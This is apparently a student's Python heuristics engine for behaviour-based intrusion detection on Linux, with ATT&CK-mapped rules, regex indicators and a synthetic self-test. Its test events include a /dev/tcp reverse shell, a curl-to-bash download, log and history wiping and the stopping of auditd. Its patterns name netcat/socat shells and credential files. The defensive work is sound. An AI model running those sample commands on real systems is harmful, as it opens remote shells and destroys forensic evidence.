#!/usr/bin/env python3
"""
Zero-Day Shield :: heuristics_engine.py

The Sentinel. Signature-free behavioural detection over normalised syscall
events. Deliberately has NO dependency on bcc, on the BPF object, or on how
main.py is organised -- it consumes dicts and returns verdicts, so it drops
into either the module-global or class-based sensor layout unchanged.

Integration (from inside any sensor callback):

    from heuristics_engine import HeuristicsEngine, normalize_execve

    engine = HeuristicsEngine()                       # once, at startup

    def handle_event(cpu, data, size):
        raw = b["exec_events"].event(data)
        for verdict in engine.evaluate(normalize_execve(raw)):
            print(verdict.render())                   # or route to the log

Standalone rule test (no root, no kernel, no attacks needed):

    python3 heuristics_engine.py --selftest
"""

from __future__ import annotations

import argparse
import os
import re
import time
from collections import defaultdict, deque
from dataclasses import dataclass, field, asdict
from typing import Any, Callable, Iterable

# =============================================================================
# Severity model
# =============================================================================

SEVERITY_BANDS = [
    (85, "CRITICAL"),
    (65, "HIGH"),
    (40, "MEDIUM"),
    (20, "LOW"),
    (0,  "INFO"),
]

ACTION_FOR_SEVERITY = {
    "CRITICAL": "TERMINATE",
    "HIGH":     "ALERT",
    "MEDIUM":   "ALERT",
    "LOW":      "MONITOR",
    "INFO":     "MONITOR",
}


def score_to_severity(score: int) -> str:
    for threshold, name in SEVERITY_BANDS:
        if score >= threshold:
            return name
    return "INFO"


# =============================================================================
# Indicator corpora
#
# Kept as data, not code, so the report can present them as a tunable
# detection surface and so you can justify every entry in your viva.
# =============================================================================

SHELLS = {"sh", "bash", "dash", "zsh", "ksh", "csh", "tcsh", "ash", "busybox"}

INTERPRETERS = {"python", "python2", "python3", "perl", "ruby", "php", "lua",
                "node", "nodejs", "awk", "gawk", "mawk"}

NET_TOOLS = {"nc", "ncat", "netcat", "socat", "telnet", "curl", "wget",
             "ftp", "tftp", "ssh"}

# Daemons that face the network and have no legitimate reason to fork a shell.
# sshd is deliberately ABSENT: sshd -> bash is a normal interactive login and
# including it would bury you in false positives.
NETWORK_DAEMONS = {"nginx", "apache2", "httpd", "php-fpm", "lighttpd", "caddy",
                   "tomcat", "java", "node", "postgres", "mysqld", "mariadbd",
                   "redis-server", "memcached", "mongod", "smbd", "vsftpd",
                   "proftpd", "exim4", "postfix", "dovecot"}

# Service accounts. Distro-dependent -- verify against /etc/passwd on the
# target host and say so in the report rather than treating this as universal.
SERVICE_ACCOUNTS = {"www-data", "nobody", "apache", "nginx", "postgres",
                    "mysql", "redis", "mongodb", "daemon", "ftp", "mail",
                    "tomcat", "jenkins"}

# Volatile / world-writable staging directories.
VOLATILE_PATHS = ("/tmp/", "/var/tmp/", "/dev/shm/", "/run/shm/",
                  "/dev/mqueue/", "/var/spool/", "/var/lock/")

# Processes whose memory holds credentials or key material.
CREDENTIAL_PROCESSES = {"sshd", "gpg-agent", "ssh-agent", "gnome-keyring-d",
                        "polkitd", "systemd-logind", "lightdm", "gdm-session-wor",
                        "sudo", "su", "login", "passwd"}

DISCOVERY_COMMANDS = {"whoami", "id", "uname", "hostname", "hostnamectl", "w",
                      "who", "last", "ifconfig", "ip", "netstat", "ss", "arp",
                      "route", "lsof", "ps", "lscpu", "lsblk", "mount", "df",
                      "getent", "groups", "sestatus", "dmidecode"}

SECURITY_TOOLING = {"auditd", "auditctl", "falco", "ossec", "wazuh-agent",
                    "clamd", "clamav", "apparmor", "aa-teardown", "setenforce",
                    "selinux", "ufw", "firewalld", "fail2ban-client", "osqueryd",
                    "sysdig", "snoopy", "rsyslog", "syslog-ng", "journald"}

# Handler ports common to Metasploit/pentest tooling. WEAK on its own -- an
# attacker changes a number. Contributes a small score, never fires alone.
SUSPICIOUS_PORTS = {4444, 4445, 1337, 31337, 8888, 9001, 9002, 5555, 6666,
                    12345, 54321, 1234, 2222}

CONTAINER_ESCAPE_TOOLS = {"nsenter", "unshare", "capsh", "runc", "ctr", "crictl"}

# --- argv pattern indicators -------------------------------------------------

RE_DEV_TCP = re.compile(r"/dev/(tcp|udp)/[\w\.\-]+/\d+")
RE_NC_EXEC = re.compile(r"\b-(e|c)\b|\bexec[:=]", re.IGNORECASE)
RE_PIPE_TO_SHELL = re.compile(
    r"\|\s*(sudo\s+)?(ba|z|da|k)?sh\b|\|\s*(python|perl|ruby|php)\d?\b")
RE_DOWNLOADER = re.compile(r"\b(curl|wget|fetch)\b")
RE_B64_BLOB = re.compile(r"[A-Za-z0-9+/]{60,}={0,2}")
RE_B64_DECODE = re.compile(r"base64\s+(-d|--decode|-di)|openssl\s+enc\s+-d")
RE_HISTORY_TAMPER = re.compile(
    r"history\s+-c|unset\s+HISTFILE|HISTFILE=/dev/null|HISTSIZE=0|"
    r"rm\s+.*\.bash_history|shred\s+.*history|>\s*~?/?\.bash_history")
RE_LOG_TAMPER = re.compile(
    r"(rm|shred|truncate|:>|>)\s*.*(/var/log/|wtmp|btmp|lastlog|auth\.log|"
    r"secure|syslog|messages)")
RE_PERSIST_CRON = re.compile(r"\bcrontab\b|/etc/cron|/var/spool/cron")
# crontab -l (list) and -r (remove) don't install anything -- the opposite
# of "persistence established" for -r, and read-only for -l. Confirmed live
# during the false-positive baseline pass: routine `crontab -l`/`crontab -r`
# admin commands fired H-012 identically to actually installing a job.
# -e (edit), a bare install-from-file, and `crontab -` (stdin install) all
# genuinely write a new crontab and stay in scope.
RE_CRON_READONLY = re.compile(r"\bcrontab\b\s+-[lr]\b")
RE_PERSIST_SSH_KEY = re.compile(r"authorized_keys|\.ssh/id_(rsa|ed25519|ecdsa)")
RE_PERSIST_SYSTEMD = re.compile(
    r"systemctl\s+(enable|link)|/etc/systemd/system/|~/.config/systemd")
RE_PERSIST_PRELOAD = re.compile(r"/etc/ld\.so\.preload|LD_PRELOAD=")
RE_CRED_FILES = re.compile(
    r"/etc/shadow|/etc/gshadow|unshadow|\bjohn\b|\bhashcat\b|"
    r"/proc/\d+/(mem|maps)\b")
RE_SETUID_HUNT = re.compile(r"-perm\s+[-/]?[0-7]*[46]000|\bgetcap\b\s+-r")
RE_DOCKER_SOCK = re.compile(r"/var/run/docker\.sock|/run/docker\.sock")
RE_KTHREAD_LOOKALIKE = re.compile(r"^\[[\w/:\-]+\]$")

FILELESS_MARKERS = ("memfd:", "/proc/self/fd/", "(deleted)")


# =============================================================================
# Data model
# =============================================================================

@dataclass
class Verdict:
    """One rule firing. The engine returns a list of these per event."""
    rule_id: str
    name: str
    technique: str                 # MITRE ATT&CK ID
    score: int
    hard: bool
    rationale: str
    event: dict[str, Any] = field(default_factory=dict)

    def render(self) -> str:
        return (f"[{self.rule_id}] {self.name} ({self.technique}) "
                f"+{self.score} :: {self.rationale}")


@dataclass
class Assessment:
    """Aggregate result for a single event, after all rules have run."""
    severity: str
    score: int
    action: str
    verdicts: list[Verdict]
    techniques: list[str]
    event: dict[str, Any]

    def to_alert(self) -> dict[str, Any]:
        """Shape expected by the forensic log / router."""
        return {
            "sensor": self.event.get("sensor"),
            "severity": self.severity,
            "engine": "heuristics",
            "risk_score": self.score,
            "recommended_action": self.action,
            "attack_techniques": self.techniques,
            "rules_fired": [v.rule_id for v in self.verdicts],
            "rationale": [v.rationale for v in self.verdicts],
            "pid": self.event.get("pid"),
            "ppid": self.event.get("ppid"),
            "uid": self.event.get("uid"),
            "comm": self.event.get("comm"),
            "detail": {k: v for k, v in self.event.items()
                       if k not in ("sensor", "pid", "ppid", "uid", "comm")},
        }


# =============================================================================
# Stateful process context
#
# Several of the strongest heuristics are only visible ACROSS events -- a
# recon burst, or a connect that follows an exec from /tmp. This table is the
# minimum state needed. Bounded by TTL and hard cap so a long capture cannot
# exhaust memory.
# =============================================================================

@dataclass
class ProcState:
    pid: int
    ppid: int = 0
    uid: int = 0
    comm: str = ""
    exe: str = ""
    argv: str = ""
    first_seen: float = field(default_factory=time.time)
    last_seen: float = field(default_factory=time.time)
    from_volatile: bool = False
    fileless: bool = False
    techniques: set[str] = field(default_factory=set)


class ProcessContext:
    TTL = 900          # seconds
    MAX = 8192
    RECON_WINDOW = 20  # seconds
    RECON_THRESHOLD = 4

    def __init__(self, stdio_probe: Callable[[int], bool] | None = None):
        self.table: dict[int, ProcState] = {}
        self.recon: dict[int, deque] = defaultdict(deque)
        self._last_prune = time.time()
        # Default resolved lazily (not as a parameter default) because
        # _stdio_is_socket is defined later in this file, below this class.
        self.stdio_probe = stdio_probe or _stdio_is_socket

    def observe(self, ev: dict) -> ProcState:
        pid = ev.get("pid", 0)
        st = self.table.get(pid)
        if st is None:
            st = ProcState(pid=pid)
            self.table[pid] = st

        st.ppid = ev.get("ppid", st.ppid)
        st.uid = ev.get("uid", st.uid)
        st.comm = ev.get("comm") or st.comm
        st.last_seen = time.time()

        if ev.get("sensor") == "execve":
            st.exe = ev.get("filename") or st.exe
            st.argv = " ".join(ev.get("argv") or [])
            st.from_volatile = _is_volatile(_resolve_invoked_path(ev))
            st.fileless = any(m in (ev.get("exe") or ev.get("filename") or "")
                              for m in FILELESS_MARKERS)

        self._maybe_prune()
        return st

    def parent_comm(self, ev: dict) -> str:
        """Parent identity, preferring what the sensor already told us."""
        if ev.get("parent_comm"):
            return ev["parent_comm"]
        st = self.table.get(ev.get("ppid", -1))
        if st and st.comm:
            return st.comm
        return _read_proc_comm(ev.get("ppid"))

    def note_recon(self, pid: int, ppid: int, cmd: str) -> int:
        """Track discovery commands per shell instance. Returns count in window.

        Bucketed by ppid: sibling discovery commands forked by the same
        shell share one. But a shell's own LAST command in a `-c 'a; b; c'`
        script is exec'd in place, not forked -- bash replaces its own image
        rather than paying for a fork it doesn't need. That command's event
        carries the shell's own pid (unchanged by exec) but the shell's
        PARENT's pid as ppid, not the pid its earlier siblings used as their
        shared ppid. Left keyed purely on ppid, this always undercounts a
        burst ending in a single trailing command by exactly one. Confirmed
        live: attack_sim.py's recon-burst (`whoami; id; uname -a; hostname`)
        put `hostname` in its own one-entry bucket, permanently one short of
        RECON_THRESHOLD. Fix: if this event's own pid is already a bucket key
        (meaning earlier siblings forked from it), fold into that bucket
        instead -- the self-exec'd command always arrives last, so its pid is
        already live as a key by the time this runs.
        """
        now = time.time()
        key = pid if pid in self.recon else ppid
        dq = self.recon[key]
        dq.append((now, cmd))
        while dq and now - dq[0][0] > self.RECON_WINDOW:
            dq.popleft()
        return len({c for _, c in dq})

    def _maybe_prune(self):
        now = time.time()
        if now - self._last_prune < 60 and len(self.table) < self.MAX:
            return
        self._last_prune = now
        dead = [p for p, s in self.table.items() if now - s.last_seen > self.TTL]
        for p in dead:
            self.table.pop(p, None)
            self.recon.pop(p, None)
        if len(self.table) > self.MAX:
            for p, _ in sorted(self.table.items(),
                               key=lambda kv: kv[1].last_seen)[:len(self.table) - self.MAX]:
                self.table.pop(p, None)


# =============================================================================
# Helpers
# =============================================================================

def _basename(path: str) -> str:
    return os.path.basename(path or "").strip()


def _is_volatile(path: str) -> bool:
    return any(path.startswith(p) for p in VOLATILE_PATHS)


def _resolve_path(ev: dict) -> str:
    """execve reports the raw filename argument, which is frequently RELATIVE
    ('./payload'). Prefix-matching it against /tmp/ silently misses the most
    common staging pattern. Prefer the resolved exe, then cwd + filename."""
    exe = ev.get("exe") or ""
    if exe.startswith("/"):
        return exe
    fname = ev.get("filename") or ""
    if fname.startswith("/"):
        return fname
    cwd = ev.get("cwd") or ""
    if cwd:
        return os.path.normpath(os.path.join(cwd, fname))
    return fname


def _resolve_invoked_path(ev: dict) -> str:
    """Like _resolve_path, but for a different question: not "what absolute
    binary path should key the allowlist" but "where did the thing that was
    actually invoked live." These differ for shebang scripts: /proc/<pid>/exe
    resolves to the INTERPRETER (e.g. /usr/bin/dash for a #!/bin/sh script),
    not the script -- preferring exe here (as _resolve_path does, correctly,
    for allowlisting) would make every "drop a script in /tmp and run it"
    attack invisible to path-based rules, since the interpreter itself lives
    in a trusted system path. Confirmed live: an attack-sim script at
    /tmp/zds-sim-xxxx/stage.sh did not trigger H-003 until this was fixed --
    _resolve_path() saw only /usr/bin/dash. Prefer the actual invoked path
    (filename, absolutized via cwd if relative); fall back to exe only when
    filename is unusable."""
    fname = ev.get("filename") or ""
    if fname.startswith("/"):
        return fname
    cwd = ev.get("cwd") or ""
    if fname and cwd:
        return os.path.normpath(os.path.join(cwd, fname))
    exe = ev.get("exe") or ""
    if exe.startswith("/"):
        return exe
    return fname


def _read_proc_comm(pid) -> str:
    if not pid:
        return ""
    try:
        with open(f"/proc/{pid}/comm", "rb") as fh:
            return fh.read().decode("utf-8", "replace").strip()
    except OSError:
        return ""


def _stdio_is_socket(pid) -> bool:
    """True reverse-shell confirmation: stdin/stdout wired to a socket.
    Racy -- the process may exit first -- so absence proves nothing."""
    hits = 0
    for fd in (0, 1, 2):
        try:
            if "socket:" in os.readlink(f"/proc/{pid}/fd/{fd}"):
                hits += 1
        except OSError:
            pass
    return hits >= 2


def _is_private(addr: str) -> bool:
    return (addr.startswith(("127.", "10.", "192.168.", "169.254.", "::1"))
            or addr.startswith("172.") and 16 <= int(addr.split(".")[1] or 0) <= 31)


# =============================================================================
# Rule registry
# =============================================================================

RULES: list[dict] = []


def rule(rule_id, name, technique, score, sensor, hard=False):
    """Register a detection. Handler returns a rationale string to fire,
    or None to stay silent."""
    def wrap(fn: Callable):
        RULES.append({"id": rule_id, "name": name, "technique": technique,
                      "score": score, "sensor": sensor, "hard": hard, "fn": fn})
        return fn
    return wrap


# --- execve rules ------------------------------------------------------------

@rule("H-001", "Shell spawned by service account", "T1059.004", 45, "execve")
def r_service_shell(ev, ctx, st):
    if _basename(ev.get("filename")) not in SHELLS:
        return None
    uid = ev.get("uid", -1)
    user = ev.get("username") or ""
    if user in SERVICE_ACCOUNTS or (0 < uid < 1000):
        return (f"UID {uid} ({user or 'system account'}) spawned "
                f"{_basename(ev.get('filename'))}; service identities have no "
                f"interactive shell requirement")
    return None


@rule("H-002", "Shell spawned by network-facing daemon", "T1059.004", 55, "execve")
def r_daemon_shell(ev, ctx, st):
    child = _basename(ev.get("filename"))
    if child not in SHELLS and child not in INTERPRETERS:
        return None
    parent = _basename(ctx.parent_comm(ev))
    if parent in NETWORK_DAEMONS:
        return (f"{parent} (network-facing) forked {child} -- canonical "
                f"web-shell / RCE execution chain")
    return None


@rule("H-003", "Execution from volatile path", "T1036.005", 40, "execve")
def r_volatile_exec(ev, ctx, st):
    path = _resolve_invoked_path(ev)
    if _is_volatile(path):
        return f"binary executed from world-writable staging directory: {path}"
    return None


@rule("H-004", "Fileless / anonymous execution", "T1620", 70, "execve", hard=True)
def r_fileless(ev, ctx, st):
    target = ev.get("exe") or ev.get("filename") or ""
    for marker in FILELESS_MARKERS:
        if marker in target:
            return (f"execution from {marker} -- no on-disk artefact for "
                    f"signature scanning or post-incident imaging")
    return None


@rule("H-005", "Bash /dev/tcp reverse shell", "T1059.004", 80, "execve", hard=True)
def r_devtcp(ev, ctx, st):
    line = " ".join(ev.get("argv") or [])
    m = RE_DEV_TCP.search(line)
    if m:
        return (f"bash pseudo-device network redirection to {m.group(0)} -- "
                f"reverse shell requiring no external binary")
    return None


@rule("H-006", "Network tool with command execution", "T1059", 70, "execve", hard=True)
def r_nc_exec(ev, ctx, st):
    name = _basename(ev.get("filename"))
    if name not in NET_TOOLS:
        return None
    line = " ".join(ev.get("argv") or [])
    if name in {"socat"} and "exec" in line.lower():
        return f"socat invoked with EXEC target: {line[:120]}"
    if name in {"nc", "ncat", "netcat"} and RE_NC_EXEC.search(line):
        return f"{name} invoked with command-execution flag: {line[:120]}"
    return None


@rule("H-007", "Download piped to interpreter", "T1105", 55, "execve")
def r_curl_pipe_sh(ev, ctx, st):
    line = " ".join(ev.get("argv") or [])
    if RE_DOWNLOADER.search(line) and RE_PIPE_TO_SHELL.search(line):
        return f"remote content piped directly to an interpreter: {line[:120]}"
    return None


@rule("H-008", "Obfuscated / encoded payload", "T1027", 40, "execve")
def r_obfuscation(ev, ctx, st):
    line = " ".join(ev.get("argv") or [])
    if RE_B64_DECODE.search(line) and RE_PIPE_TO_SHELL.search(line):
        return "base64-decoded content piped to a shell"
    m = RE_B64_BLOB.search(line)
    if m:
        return f"high-entropy encoded blob of {len(m.group(0))} chars in argv"
    return None


@rule("H-009", "Command history / log tampering", "T1070.003", 55, "execve")
def r_antiforensics(ev, ctx, st):
    line = " ".join(ev.get("argv") or [])
    if RE_HISTORY_TAMPER.search(line):
        return f"shell history destruction: {line[:120]}"
    if RE_LOG_TAMPER.search(line):
        return f"system log destruction: {line[:120]}"
    return None


@rule("H-010", "Security tooling disabled", "T1562.001", 65, "execve")
def r_disable_defenses(ev, ctx, st):
    line = " ".join(ev.get("argv") or [])
    low = line.lower()
    if not any(k in low for k in ("stop", "disable", "kill", "mask", "flush",
                                  "setenforce 0", "teardown")):
        return None
    for tool in SECURITY_TOOLING:
        if tool in low:
            return f"attempt to disable host defence '{tool}': {line[:120]}"
    return None


@rule("H-011", "System discovery burst", "T1082", 35, "execve")
def r_recon_burst(ev, ctx, st):
    cmd = _basename(ev.get("filename"))
    if cmd not in DISCOVERY_COMMANDS:
        return None
    distinct = ctx.note_recon(ev.get("pid", 0), ev.get("ppid", 0), cmd)
    if distinct >= ProcessContext.RECON_THRESHOLD:
        return (f"{distinct} distinct discovery commands from PPID "
                f"{ev.get('ppid')} within {ProcessContext.RECON_WINDOW}s -- "
                f"automated enumeration, not human typing")
    return None


@rule("H-012", "Persistence mechanism established", "T1053.003", 55, "execve")
def r_persistence(ev, ctx, st):
    line = " ".join(ev.get("argv") or [])
    for pattern, label, tech in (
        (RE_PERSIST_CRON, "cron scheduling", "T1053.003"),
        (RE_PERSIST_SSH_KEY, "SSH authorized_keys", "T1098.004"),
        (RE_PERSIST_SYSTEMD, "systemd unit", "T1543.002"),
        (RE_PERSIST_PRELOAD, "ld.so.preload hijack", "T1574.006"),
    ):
        if pattern.search(line):
            if pattern is RE_PERSIST_CRON and RE_CRON_READONLY.search(line):
                continue
            return f"{label} touched from a monitored process: {line[:120]}"
    return None


@rule("H-013", "Credential store access", "T1003.008", 60, "execve")
def r_credentials(ev, ctx, st):
    line = " ".join(ev.get("argv") or [])
    if RE_CRED_FILES.search(line):
        return f"access to credential or process-memory artefact: {line[:120]}"
    return None


@rule("H-014", "Process masquerading", "T1036.004", 50, "execve")
def r_masquerade(ev, ctx, st):
    fname = ev.get("filename") or ""
    base = _basename(fname)
    if RE_KTHREAD_LOOKALIKE.match(base):
        return f"userland binary imitating a kernel thread name: {base}"
    if base != base.strip() or "  " in base:
        return f"executable name contains padding whitespace: {base!r}"
    comm = ev.get("comm") or ""
    if comm and base and not base.startswith(comm[:15]) and st.fileless:
        return f"comm '{comm}' inconsistent with anonymous exec target"
    return None


@rule("H-015", "Container escape tooling", "T1611", 55, "execve")
def r_container_escape(ev, ctx, st):
    name = _basename(ev.get("filename"))
    line = " ".join(ev.get("argv") or [])
    if name in CONTAINER_ESCAPE_TOOLS:
        return f"namespace manipulation utility invoked: {name} {line[:100]}"
    if RE_DOCKER_SOCK.search(line):
        return f"direct access to the container runtime socket: {line[:120]}"
    return None


@rule("H-016", "SUID / capability enumeration", "T1548.001", 30, "execve")
def r_setuid_hunt(ev, ctx, st):
    line = " ".join(ev.get("argv") or [])
    if RE_SETUID_HUNT.search(line):
        return f"filesystem-wide privilege-escalation search: {line[:120]}"
    return None


# --- ptrace rules ------------------------------------------------------------

WRITE_REQUESTS = {"PTRACE_POKETEXT", "PTRACE_POKEDATA", "PTRACE_POKEUSR",
                  "PTRACE_SETREGS", "PTRACE_SETREGSET"}
ATTACH_REQUESTS = {"PTRACE_ATTACH", "PTRACE_SEIZE"}


@rule("H-020", "Live code injection", "T1055.008", 80, "ptrace", hard=True)
def r_ptrace_write(ev, ctx, st):
    if ev.get("request") in WRITE_REQUESTS:
        return (f"{ev['request']} against {ev.get('target_comm','?')}"
                f"({ev.get('target_pid')}) -- memory or register state of a "
                f"live process was rewritten")
    return None


@rule("H-021", "Debugger attach to foreign process", "T1055.008", 50, "ptrace")
def r_ptrace_attach(ev, ctx, st):
    if ev.get("request") not in ATTACH_REQUESTS:
        return None
    tgt = ev.get("target_pid")
    tgt_state = ctx.table.get(tgt)
    if tgt_state and tgt_state.ppid == ev.get("pid"):
        return None      # tracing your own child is ordinary debugging
    return (f"{ev['request']} to non-descendant PID {tgt} "
            f"({ev.get('target_comm','?')})")


@rule("H-022", "Detection engine targeted", "T1562.001", 100, "ptrace", hard=True)
def r_ptrace_self(ev, ctx, st):
    if ev.get("targets_sensor"):
        return ("a process attached to the Zero-Day Shield itself -- direct "
                "attempt to blind or manipulate the monitoring agent")
    return None


@rule("H-023", "Credential process memory access", "T1003", 75, "ptrace", hard=True)
def r_ptrace_creds(ev, ctx, st):
    tgt = _basename(ev.get("target_comm") or "")
    if tgt in CREDENTIAL_PROCESSES:
        return (f"ptrace against {tgt} -- process holds authentication "
                f"material in memory")
    return None


# --- connect rules -----------------------------------------------------------

@rule("H-030", "Interpreter initiated outbound connection", "T1059", 60, "connect")
def r_shell_connect(ev, ctx, st):
    comm = _basename(ev.get("comm") or "")
    if comm not in SHELLS and comm not in INTERPRETERS:
        return None
    daddr = ev.get("daddr") or ""
    if not daddr or _is_private(daddr):
        return None
    return (f"{comm} opened a socket to {daddr}:{ev.get('dport')} -- shells "
            f"and interpreters rarely initiate egress on their own")


@rule("H-031", "Socket bound to process stdio", "T1059", 85, "connect", hard=True)
def r_stdio_socket(ev, ctx, st):
    comm = _basename(ev.get("comm") or "")
    if comm not in SHELLS and comm not in INTERPRETERS:
        return None
    if ctx.stdio_probe(ev.get("pid")):
        return (f"stdin/stdout of {comm}({ev.get('pid')}) are sockets -- "
                f"confirmed interactive reverse shell, not merely egress")
    return None


@rule("H-032", "Egress from volatile-path binary", "T1571", 50, "connect")
def r_volatile_connect(ev, ctx, st):
    if st.from_volatile or st.fileless:
        origin = "anonymous memory" if st.fileless else st.exe
        return (f"outbound connection to {ev.get('daddr')}:{ev.get('dport')} "
                f"from a process executed out of {origin}")
    return None


@rule("H-033", "Connection to known handler port", "T1571", 25, "connect")
def r_bad_port(ev, ctx, st):
    port = ev.get("dport")
    if port in SUSPICIOUS_PORTS:
        return (f"destination port {port} is a common offensive-framework "
                f"listener (weak indicator; corroboration required)")
    return None


# =============================================================================
# Engine
# =============================================================================

class HeuristicsEngine:
    """Evaluates normalised events against the rule set.

    Allowlisting is intentionally keyed on absolute exe PATH, never on comm.
    comm is attacker-controlled -- copying a payload to /tmp/gdb would buy
    immunity from any comm-based exclusion.
    """

    def __init__(self, allowlist_paths: Iterable[str] = (), min_report="LOW",
                 stdio_probe: Callable[[int], bool] | None = None):
        self.ctx = ProcessContext(stdio_probe=stdio_probe)
        self.allowlist = set(allowlist_paths)
        self.min_report = min_report
        self.stats: dict[str, int] = defaultdict(int)

    def _allowed(self, ev) -> bool:
        path = _resolve_path(ev)
        return bool(path) and path in self.allowlist

    def evaluate(self, ev: dict) -> Assessment | None:
        sensor = ev.get("sensor")
        st = self.ctx.observe(ev)

        if sensor == "execve" and self._allowed(ev):
            return None

        verdicts: list[Verdict] = []
        for r in RULES:
            if r["sensor"] != sensor:
                continue
            try:
                rationale = r["fn"](ev, self.ctx, st)
            except Exception as exc:               # a broken rule must never
                self.stats["rule_errors"] += 1     # take the sensor offline
                continue
            if rationale:
                verdicts.append(Verdict(
                    rule_id=r["id"], name=r["name"], technique=r["technique"],
                    score=r["score"], hard=r["hard"], rationale=rationale,
                ))

        if not verdicts:
            return None

        total = sum(v.score for v in verdicts)
        # Corroboration bonus: independent weak signals on one event are
        # substantially more meaningful than any of them alone. This is what
        # lets the engine catch novel tooling that matches no single rule.
        if len(verdicts) > 1:
            total += 10 * (len(verdicts) - 1)

        severity = "CRITICAL" if any(v.hard for v in verdicts) else score_to_severity(total)

        for v in verdicts:
            st.techniques.add(v.technique)
            self.stats[v.rule_id] += 1
        self.stats[severity] += 1

        return Assessment(
            severity=severity,
            score=min(total, 100),
            action=ACTION_FOR_SEVERITY[severity],
            verdicts=verdicts,
            techniques=sorted({v.technique for v in verdicts}),
            event=ev,
        )

    def coverage(self) -> list[dict]:
        """ATT&CK coverage matrix for the report."""
        return [{"rule": r["id"], "name": r["name"], "technique": r["technique"],
                 "sensor": r["sensor"], "weight": r["score"],
                 "override": r["hard"], "fired": self.stats.get(r["id"], 0)}
                for r in RULES]


# =============================================================================
# Offline test doubles -- normalize() now lives on each sensor class per the
# contract in CLAUDE.md, so this module no longer owns the integration
# surface. What remains here is a fake replacement for _stdio_is_socket, used
# by --demo and test_integration.py so H-031 can be exercised without a real
# process wired to a socket fd.
# =============================================================================

def _fake_stdio_probe(pid) -> bool:
    """Offline stand-in for _stdio_is_socket. Returns True only for the
    SELFTEST_EVENTS pid representing the confirmed reverse shell (4003 --
    same pid as the /dev/tcp execve event, by design)."""
    return pid == 4003


# =============================================================================
# Self-test -- exercises every rule with synthetic events.
# No root, no kernel, no live malware required.
# =============================================================================

SELFTEST_EVENTS = [
    {"sensor": "execve", "pid": 4001, "ppid": 900, "uid": 33, "comm": "nginx",
     "username": "www-data", "filename": "/bin/sh", "exe": "/bin/dash",
     "argv": ["/bin/sh", "-i"], "cwd": "/var/www", "parent_comm": "nginx"},

    {"sensor": "execve", "pid": 4002, "ppid": 4001, "uid": 33, "comm": "sh",
     "filename": "./stage2", "exe": "/tmp/.x/stage2", "cwd": "/tmp/.x",
     "argv": ["./stage2"], "parent_comm": "sh"},

    {"sensor": "execve", "pid": 4003, "ppid": 4001, "uid": 0, "comm": "sh",
     "filename": "/bin/bash", "exe": "memfd:payload (deleted)",
     "argv": ["bash", "-c", "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"],
     "cwd": "/", "parent_comm": "sh"},

    {"sensor": "execve", "pid": 4004, "ppid": 4001, "uid": 0, "comm": "bash",
     "filename": "/usr/bin/curl", "exe": "/usr/bin/curl", "cwd": "/root",
     "argv": ["curl", "-s", "http://203.0.113.9/i.sh", "|", "bash"],
     "parent_comm": "bash"},

    {"sensor": "execve", "pid": 4005, "ppid": 4001, "uid": 0, "comm": "bash",
     "filename": "/bin/bash", "exe": "/bin/bash", "cwd": "/root",
     "argv": ["bash", "-c", "history -c; rm -f /var/log/auth.log"],
     "parent_comm": "bash"},

    {"sensor": "execve", "pid": 4006, "ppid": 4001, "uid": 0, "comm": "bash",
     "filename": "/usr/bin/systemctl", "exe": "/usr/bin/systemctl",
     "argv": ["systemctl", "stop", "auditd"], "cwd": "/", "parent_comm": "bash"},

    # Four distinct discovery commands from one parent -> burst rule
    *[{"sensor": "execve", "pid": 4010 + i, "ppid": 4001, "uid": 0,
       "comm": "bash", "filename": f"/usr/bin/{c}", "exe": f"/usr/bin/{c}",
       "argv": [c], "cwd": "/root", "parent_comm": "bash"}
      for i, c in enumerate(("whoami", "id", "uname", "netstat"))],

    {"sensor": "ptrace", "pid": 4020, "ppid": 4001, "uid": 0, "comm": "injector",
     "request": "PTRACE_POKETEXT", "target_pid": 1337, "target_comm": "sshd",
     "targets_sensor": False},

    {"sensor": "ptrace", "pid": 4021, "ppid": 4001, "uid": 0, "comm": "evil",
     "request": "PTRACE_ATTACH", "target_pid": 999,
     "target_comm": "zero_day_shield", "targets_sensor": True},

    {"sensor": "connect", "pid": 4003, "ppid": 4001, "uid": 0, "comm": "bash",
     "family": "AF_INET", "daddr": "203.0.113.9", "dport": 4444, "ret": 0},

    # Benign controls -- these must produce nothing.
    {"sensor": "execve", "pid": 5001, "ppid": 1, "uid": 1000, "comm": "systemd",
     "filename": "/usr/bin/ls", "exe": "/usr/bin/ls", "argv": ["ls", "-la"],
     "cwd": "/home/student", "parent_comm": "systemd"},
    {"sensor": "execve", "pid": 5002, "ppid": 800, "uid": 1000, "comm": "sshd",
     "filename": "/bin/bash", "exe": "/bin/bash", "argv": ["-bash"],
     "cwd": "/home/student", "parent_comm": "sshd"},
]


def selftest():
    engine = HeuristicsEngine()
    fired = 0
    print(f"Running {len(SELFTEST_EVENTS)} synthetic events through "
          f"{len(RULES)} rules\n" + "=" * 78)

    for ev in SELFTEST_EVENTS:
        result = engine.evaluate(ev)
        label = f"{ev['sensor']:<8} pid={ev['pid']:<6} {ev.get('comm',''):<12}"
        if result is None:
            print(f"  clean    {label}")
            continue
        fired += 1
        print(f"\n  {result.severity:<8} {label} score={result.score} "
              f"action={result.action}")
        print(f"           ATT&CK: {', '.join(result.techniques)}")
        for v in result.verdicts:
            print(f"           - {v.render()}")

    print("\n" + "=" * 78)
    print(f"{fired}/{len(SELFTEST_EVENTS)} events produced findings")

    unfired = [r["id"] for r in RULES if engine.stats.get(r["id"], 0) == 0]
    if unfired:
        print(f"Rules with no self-test coverage: {', '.join(unfired)}")
    print("\nATT&CK coverage:")
    for row in engine.coverage():
        mark = "*" if row["override"] else " "
        print(f"  {mark} {row['rule']}  {row['technique']:<12} "
              f"w={row['weight']:<3} {row['sensor']:<8} {row['name']}")
    print("  (* = hard override: forces CRITICAL regardless of score)")


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="Zero-Day Shield heuristics engine")
    ap.add_argument("--selftest", action="store_true",
                    help="run synthetic events through every rule")
    ap.add_argument("--coverage", action="store_true",
                    help="print the ATT&CK coverage matrix and exit")
    a = ap.parse_args()

    if a.coverage:
        for row in HeuristicsEngine().coverage():
            print(f"{row['rule']}\t{row['technique']}\t{row['sensor']}\t"
                  f"{row['weight']}\t{row['name']}")
    else:
        selftest()
